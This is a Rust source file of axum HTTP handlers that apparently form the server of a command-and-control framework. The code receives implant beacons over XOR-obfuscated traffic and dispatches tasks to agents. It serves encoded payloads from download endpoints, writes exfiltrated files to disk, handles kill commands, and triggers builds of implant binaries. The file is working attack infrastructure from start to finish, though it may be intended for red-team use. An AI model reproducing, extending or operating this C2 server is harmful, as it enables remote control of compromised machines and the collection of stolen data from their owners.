use std::sync::Arc;

use crate::{
    admin_task_dispatch::{admin_dispatch, build_all_bins},
    agents::handle_kill_command,
    app_state::AppState,
    exfil::handle_exfiltrated_file,
    net::{serialise_tasks_for_agent, serve_file},
};
use axum::{
    Json,
    extract::{Path, Query, Request, State},
    http::{HeaderMap, StatusCode},
    response::{IntoResponse, Response},
};
use serde::Deserialize;
use shared::{
    net::{XorEncode, decode_http_response},
    tasks::{AdminCommand, BuildAllBins, Command, FirstRunData},
};

/// Handles the inbound connection, after authentication has validated the agent.
///
/// This is very much the 'end destination' for the inbound connection.
#[axum::debug_handler]
pub async fn handle_agent_get(state: State<Arc<AppState>>, request: Request) -> Vec<u8> {
    // Get the agent by its header, and fetch tasks from the db
    let (agent, tasks) = state
        .connected_agents
        .get_agent_and_tasks_by_header(request.headers(), &state.clone().db_pool, None)
        .await;

    // Check whether the kill command is present and the agent needs removing from the live list..
    handle_kill_command(state.connected_agents.clone(), &agent, &tasks);

    serialise_tasks_for_agent(tasks).await
}

/// Handles the inbound connection when the URI contains a path. The function will check to see if the path
/// is present in either the active C2 listener endpoints, or whether it is used to serve content.
#[axum::debug_handler]
pub async fn handle_agent_get_with_path(
    state: State<Arc<AppState>>,
    Path(endpoint): Path<String>,
    request: Request,
) -> Response {
    let state_arc = Arc::clone(&state);

    //
    // First check whether the URI is in the valid GET endpoints for the agent
    //
    let lock = state_arc.endpoints.read().await;

    if lock.c2_endpoints.contains(&endpoint) {
        // There is no need to authenticate here, that is done subsequently during
        // `handle_agent_get` where we pull the agent_id from the header
        return handle_agent_get(state, request).await.into_response();
    }

    //
    // Now we check whether it was a request to the download URI, if it is, we can serve that content
    // over to them.
    //
    if let Some(metadata) = lock.download_endpoints.get(&endpoint) {
        let filename = &metadata.file_name;
        return serve_file(filename, metadata.xor_key).await.into_response();
    }

    StatusCode::BAD_GATEWAY.into_response()
}

pub async fn handle_agent_post_with_path(
    state: State<Arc<AppState>>,
    headers: HeaderMap,
    Path(endpoint): Path<String>,
    Json(payload): Json<Vec<Vec<u8>>>,
) -> impl IntoResponse {
    let state_arc = Arc::clone(&state);

    {
        let lock = state_arc.endpoints.read().await;
        if lock.c2_endpoints.contains(&endpoint) {
            // No requirement to further authenticate, as this is handled by the middleware
            return handle_agent_post(state, headers, Json(payload))
                .await
                .into_response();
        }
    }

    // endpoint not found / valid
    StatusCode::BAD_GATEWAY.into_response()
}

pub async fn handle_agent_post(
    state: State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<Vec<Vec<u8>>>,
) -> Vec<u8> {
    let cl = state.clone();

    // We check the payload length later in an assert to make sure there is no incorrect state going on.
    let payload_len = payload.len();

    for item in payload {
        let decoded = item.xor_network_stream();

        let mut task = decode_http_response(&decoded);

        //
        // First we check here whether the agent is connecting for the FIRST time since it was exited.
        // For example, from a reboot, or from killing the process.
        // This does not mean, first time ever seen like full stop, that doesn't matter.
        //
        // We split the separation because we don't want to start making things completed as below with
        // `mark_task_completed`, or adding to the completed pool, as this task will never exist in the database.
        // It serves only the implant itself.
        //
        // NOTE: This branch will RETURN from the processing of the beacons tasks; in theory there should ONLY
        // ever be this one `Command` sent up to the C2 on first connect, so it should be fine - I cannot see
        // any circumstance where other tasks will be pending processing along-with this command, unless we mess
        // up and accidentally write this task somewhere we shouldn't. If that happens, hopefully this comment
        // will help debug :).
        //
        if task.command == Command::AgentsFirstSessionBeacon {
            // Validate the state that there is only 1 task.
            // The invalid state will brick implants, so forces the bug to be reviewed if it appears.
            // But.. this should never appear.
            assert!(payload_len == 1);

            let first_run_data: FirstRunData = match serde_json::from_str(&task.metadata.unwrap()) {
                Ok(d) => d,
                Err(e) => panic!("Failed to deserialise first run data from string. {e}"),
            };

            // Serialise the tasks and send them back
            let (agent, tasks) = state
                .connected_agents
                .get_agent_and_tasks_by_header(&headers, &cl.db_pool, Some(first_run_data))
                .await;

            let mut init_tasks = agent.get_config_data();
            if let Some(mut tasks) = tasks {
                init_tasks.append(&mut tasks);
            }

            return serialise_tasks_for_agent(Some(init_tasks)).await;
        }

        // Handle file exfil - save to disk and remove the exfil bytes, we dont want to store those
        // in the database if we are saving the file to disk.
        if task.command == Command::Pull {
            handle_exfiltrated_file(&mut task).await;
        }

        //
        // Command::AgentsFirstSessionBeacon was not present, so continue to
        //

        if let Err(e) = state.db_pool.mark_task_completed(&task).await {
            panic!("[-] Failed to complete task in db. {e}");
        }

        if let Err(e) = state.db_pool.add_completed_task(&task).await {
            panic!("[-] Failed to add task results to completed table. {e}");
        }
    }

    //
    // Get any additional tasks from the database.
    //
    let (agent, tasks) = state
        .connected_agents
        .get_agent_and_tasks_by_header(&headers, &cl.db_pool, None)
        .await;

    //
    // Check whether the kill command is present and the agent needs removing from the live list..
    //
    handle_kill_command(state.connected_agents.clone(), &agent, &tasks);

    //
    // Serialise the response and return it
    //
    serialise_tasks_for_agent(tasks).await
}

pub async fn handle_admin_commands_on_agent(
    state: State<Arc<AppState>>,
    Path(uid): Path<String>,
    command: Json<AdminCommand>,
) -> (StatusCode, Vec<u8>) {
    let response_body_serialised = admin_dispatch(Some(uid), command.0, state).await;

    // Happy response
    (StatusCode::ACCEPTED, response_body_serialised)
}

pub async fn handle_admin_commands_without_agent(
    state: State<Arc<AppState>>,
    command: Json<AdminCommand>,
) -> (StatusCode, Vec<u8>) {
    let response_body_serialised = admin_dispatch(None, command.0, state).await;

    // Happy response
    (StatusCode::ACCEPTED, response_body_serialised)
}

pub async fn poll_agent_notifications(
    state: State<Arc<AppState>>,
    Path(uid): Path<String>,
) -> (StatusCode, String) {
    match state.db_pool.agent_has_pending_notifications(&uid).await {
        Ok(has_pending) => {
            if has_pending || state.connected_agents.contains_agent_by_id(&uid) {
                (StatusCode::OK, has_pending.to_string())
            } else {
                (StatusCode::NOT_FOUND, has_pending.to_string())
            }
        }
        Err(_) => (StatusCode::INTERNAL_SERVER_ERROR, "".to_string()),
    }
}

#[derive(Deserialize)]
pub struct BaBData {
    profile_name: String,
}

pub async fn build_all_binaries_handler(
    state: State<Arc<AppState>>,
    data: Query<BaBData>,
) -> Response {
    let bab = (data.profile_name.clone(), "".to_string(), None, None);
    let result = build_all_bins(bab, state).await;

    result.into_response()
}
